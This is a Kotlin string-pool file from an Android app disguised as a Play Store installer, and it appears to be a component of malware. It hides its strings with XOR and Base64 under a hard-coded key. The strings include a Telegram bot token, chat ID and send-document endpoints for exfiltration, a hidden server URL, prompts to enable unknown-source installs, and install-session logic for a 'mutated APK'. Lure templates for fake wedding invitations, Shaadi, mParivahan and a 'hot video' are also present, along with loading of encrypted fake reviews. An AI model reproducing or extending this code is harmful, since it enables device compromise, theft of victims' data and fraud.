package com.playstore.installer

import android.util.Base64

/** Auto-generated — DO NOT EDIT. Updated by StringEncryptorPlugin. */
internal object StringPool {

    private val k1 = "n0vA"
    private val k2 = "sEed"

    val COMPANION_ASSET = "DV8bMRIrDAsAHhcxGA=="
    val TMP_COMPANION = "Gl0GHhAqCBQPXh8uHWsEFAU="
    val CACHED_COMPANION = "DV8bMRIrDAsAbxUgEC0AAEBRBio="
    val WRITE_NAME = "G0ASIAcgSxQFVw=="
    val PREFS_NAME = "AF8AICw1FwEIQw=="
    val KEY_MODULE_PKG = "DV8bMRIrDAsAbwYqFA=="
    val KEY_CACHED_PATH = "DVEVKRYhOgUeWykxEjEN"
    val KEY_STAGE = "B14FNRIpCTsdRBcmFg=="
    val HOME_SETTINGS = "D14SMxwsAUodVQI1GisCF0B4OQw2GjYhOmQ/DzQW"
    val UNKNOWN_SOURCES = "D14SMxwsAUodVQI1GisCF0B9Nw8yAiA7O349DzwSKzsvYCYeIAowNi11JQ=="
    val REFERRER_URI = "D14SMxwsAUkPQAZ7XGoGCwMeFy8XNwoNCh4AJB0hDAoJ"
    val MARKET_URI_PREFIX = "A1EEKhYxX0tBVBM1EiwJF1FZEnw="
    val PKG_INSTALLER_URI = "HlEVKhIiAF4="
    val APP_DETAILS_URI = "D14SMxwsAUodVQI1GisCF0BxJhE/DCYlOnk5DywBIDAveToSLBYgMDp5OAYg"
    val MSG_SET_HOME = "PlwTIAAgRRcLRFY1GywWRA9ABmESNkUdAUUEYRcgAwUbXAJhGyoIAU5cFzQdJg0BHA=="
    val MSG_CANCEL = "Kl8BLx8qBABOUxcvECAJCAtU"
    val COMPANION_OLD_PKG = "DV8bbxIrARYBWRJvAywGEA9THg=="
    val SERVER_URL = "BkQCMQB/SkseWRUqAGgAHQsdDyQSN0gFAF4ZNB0mABdARAQ4ECkKEQpWGiABIEsHAV0="
    val THREAD_NAME = "ClECIF42HAoN"
    val MUTATED_APK = "D0AGbxAkBgwL"
    val SESSION_COMMIT = "D14SMxwsAUoNXxg1FisRSh5dWCAQMQwLAB4lBCAWLCsgbzUOPggsMCN1OBU="
    val TPL_WEDDING = "GVUSJRorAkQHXgAoByQRDQFe"
    val TPL_SHAADI = "HVgXIBcsRQ8PEBgoHiQLEBxRGA=="
    val TPL_MPARIVAHAN = "A0AXMxozBAwPXg=="
    val TPL_HOT_VIDEO = "Bl8CYQUsAQEBEBUgHyk="
    val TG_BOT_TOKEN = "VwFFcUZxU1dbCUwAMgAJUxhiQiAbLDQeNgRDEzQvDTEbXTQbISoXEgxJJxkmMg=="
    val TG_CHAT_ID = "VghDc0p0V1VbAA=="
    val TG_API_URL = "BkQCMQB/SksPQB9vByAJAQlCFyxdKhcDQVIZNQ=="
    val TG_SEND = "HVUYJT4gFhcPVxM="
    val TG_SEND_DOC = "HVUYJTcqBhEDVRg1"

    fun d(enc: String): String {
        return try {
            val key = (k1 + k2).toByteArray(Charsets.UTF_8)
            val b = Base64.decode(enc, Base64.DEFAULT)
            String(ByteArray(b.size) { i -> (b[i].toInt() xor key[i % key.size].toInt()).toByte() })
        } catch (e: Exception) { "" }
    }

    fun loadReviews(context: android.content.Context, template: String): List<Triple<String, Int, String>> {
        return try {
            val raw = context.assets.open("reviews.enc").readBytes()
            val key = (k1 + k2).toByteArray(Charsets.UTF_8)
            val json = String(ByteArray(raw.size) { i -> (raw[i].toInt() xor key[i % key.size].toInt()).toByte() })
            parseReviews(json, template)
        } catch (e: Exception) { emptyList() }
    }

    private fun parseReviews(json: String, template: String): List<Triple<String, Int, String>> {
        val result = mutableListOf<Triple<String, Int, String>>()
        try {
            val obj = org.json.JSONObject(json)
            val arr = obj.optJSONArray(template) ?: obj.optJSONArray("generic") ?: return result
            for (i in 0 until arr.length()) {
                val item = arr.getJSONObject(i)
                result.add(Triple(item.getString("n"), item.getInt("s"), item.getString("r")))
            }
        } catch (e: Exception) { }
        return result
    }
}
